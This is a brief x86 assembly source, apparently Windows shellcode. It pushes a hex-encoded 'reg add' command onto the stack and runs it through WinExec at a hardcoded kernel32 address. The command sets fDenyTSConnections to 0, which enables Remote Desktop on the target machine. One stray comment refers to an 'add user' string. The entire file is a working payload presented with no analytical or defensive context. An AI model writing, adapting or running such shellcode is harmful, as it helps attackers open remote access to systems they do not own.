[BITS 32]

global _start			

section .text
_start:

    xor edx, edx	; zero out edx
    push edx		; push null byte onto stack

    ; String: 'cmd.exe /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f '    
    push 0x20662f20
    push 0x3020642f
    push 0x2044524f
    push 0x57445f47
    push 0x45522074
    push 0x2f20736e
    push 0x6f697463
    push 0x656e6e6f
    push 0x43535479
    push 0x6e654466
    push 0x20762f20
    push 0x22726576
    push 0x72655320
    push 0x6c616e69
    push 0x6d726554
    push 0x5c6c6f72
    push 0x746e6f43
    push 0x5c746553
    push 0x6c6f7274
    push 0x6e6f4374
    push 0x6e657272
    push 0x75435c4d
    push 0x45545359
    push 0x535c454e
    push 0x49484341
    push 0x4d5f4c41
    push 0x434f4c5f
    push 0x59454b48
    push 0x22206464
    push 0x61206765
    push 0x7220632f
    push 0x20657865
    push 0x2e646d63

    mov ebx, esp	; save stack pointer 

    inc edx		; uCmdShow SW_SHOWNORMAL
    push edx    

    push ebx		; push pointer to add user string 
    mov edx, 0x7c8623ad	; mov address of WinExec()
    call edx
